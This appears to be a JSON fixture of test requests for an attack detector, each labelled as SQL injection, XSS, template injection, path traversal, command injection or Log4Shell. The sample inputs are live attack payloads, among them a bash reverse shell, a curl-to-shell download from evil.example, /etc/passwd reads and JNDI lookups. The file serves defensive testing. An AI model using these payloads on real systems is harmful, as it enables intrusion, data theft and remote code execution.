[
  {"id": "sqli-boolean-quote", "request": {"query": "id=1' OR '1'='1"}, "expect": ["sqli"]},
  {"id": "sqli-union-select", "request": {"query": "id=1 UNION SELECT username,password FROM users--"}, "expect": ["sqli"]},
  {"id": "sqli-union-comment-spaces", "request": {"query": "id=1+UNION/**/SELECT+1,2,3"}, "expect": ["sqli"]},
  {"id": "sqli-time-sleep", "request": {"query": "id=1 AND SLEEP(5)"}, "expect": ["sqli"]},
  {"id": "sqli-stacked-drop", "request": {"query": "id=1; DROP TABLE users--"}, "expect": ["sqli"]},
  {"id": "sqli-url-encoded", "request": {"query": "id=1%27%20OR%201%3D1--"}, "expect": ["sqli"]},
  {"id": "sqli-login-body", "request": {"body": "username=admin'--&password=x"}, "expect": ["sqli"]},
  {"id": "sqli-boolean-blind-substring", "request": {"query": "id=1 AND ASCII(SUBSTRING(version(),1,1))>50"}, "expect": ["sqli"]},
  {"id": "sqli-error-based-extractvalue", "request": {"query": "id=1 AND extractvalue(1,concat(0x7e,version()))"}, "expect": ["sqli"]},
  {"id": "sqli-schema-enumeration", "request": {"query": "q=x' UNION SELECT table_name FROM information_schema.tables--"}, "expect": ["sqli"]},
  {"id": "sqli-system-access-version", "request": {"query": "id=1 AND @@version LIKE '5%'"}, "expect": ["sqli"]},
  {"id": "sqli-order-by-probe", "request": {"query": "sort=name' ORDER BY 7--"}, "expect": ["sqli"]},

  {"id": "xss-script-tag", "request": {"query": "q=<script>alert(1)</script>"}, "expect": ["xss"]},
  {"id": "xss-img-onerror", "request": {"query": "q=<img src=x onerror=alert(1)>"}, "expect": ["xss"]},
  {"id": "xss-svg-onload-breakout", "request": {"query": "q=\"><svg onload=alert(1)>"}, "expect": ["xss"]},
  {"id": "xss-javascript-uri", "request": {"query": "next=javascript:alert(document.cookie)"}, "expect": ["xss"]},
  {"id": "xss-json-iframe", "request": {"body": "{\"comment\": \"<iframe src=//evil.example></iframe>\"}"}, "expect": ["xss"]},

  {"id": "ssti-jinja-arith", "request": {"query": "name={{7*7}}"}, "expect": ["ssti"]},
  {"id": "ssti-jinja-globals", "request": {"query": "name={{config.__class__.__init__.__globals__}}"}, "expect": ["ssti"]},
  {"id": "ssti-el-arith", "request": {"query": "name=${7*7}"}, "expect": ["ssti"]},
  {"id": "ssti-erb-arith", "request": {"query": "name=<%= 7*7 %>"}, "expect": ["ssti"]},

  {"id": "traversal-dotdot", "request": {"query": "file=../../../../etc/passwd"}, "expect": ["traversal"]},
  {"id": "traversal-encoded", "request": {"query": "file=..%2f..%2f..%2fetc%2fpasswd"}, "expect": ["traversal"]},
  {"id": "traversal-double-encoded-path", "request": {"path": "/static/..%252f..%252fetc/passwd"}, "expect": ["traversal"]},
  {"id": "traversal-php-filter", "request": {"query": "file=php://filter/convert.base64-encode/resource=index.php"}, "expect": ["traversal"]},
  {"id": "traversal-remote-include", "request": {"query": "page=http://evil.example/shell.txt"}, "expect": ["traversal"]},
  {"id": "traversal-windows", "request": {"query": "file=C:\\windows\\win.ini"}, "expect": ["traversal"]},

  {"id": "cmdi-chain-cat", "request": {"query": "host=127.0.0.1; cat /etc/passwd"}, "expect": ["cmdi", "traversal"]},
  {"id": "cmdi-subshell", "request": {"query": "host=$(whoami)"}, "expect": ["cmdi"]},
  {"id": "cmdi-reverse-shell", "request": {"query": "cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, "expect": ["cmdi"]},
  {"id": "cmdi-download-pipe-sh", "request": {"query": "cmd=curl http://evil.example/x.sh | sh"}, "expect": ["cmdi"]},
  {"id": "cmdi-absolute-path-command", "request": {"query": "host=x;/usr/bin/id"}, "expect": ["cmdi"]},
  {"id": "cmdi-ifs-evasion", "request": {"query": "file=a;cat${IFS}notes.txt"}, "expect": ["cmdi"]},
  {"id": "cmdi-oob-callback", "request": {"query": "host=abc123.oast.fun"}, "expect": ["cmdi"]},
  {"id": "cmdi-shellshock-header", "request": {"headers": [["User-Agent", "() { :;}; /bin/bash -c 'id'"]]}, "expect": ["cmdi"]},

  {"id": "log4shell-ua", "request": {"headers": [["User-Agent", "${jndi:ldap://evil.example/a}"]]}, "expect": ["log4shell"]},
  {"id": "log4shell-obfuscated-header", "request": {"headers": [["X-Api-Version", "${${lower:j}ndi:ldap://evil.example/a}"]]}, "expect": ["log4shell"]},
  {"id": "log4shell-encoded-query", "request": {"query": "x=%24%7Bjndi:ldap://evil.example/a%7D"}, "expect": ["log4shell"]},
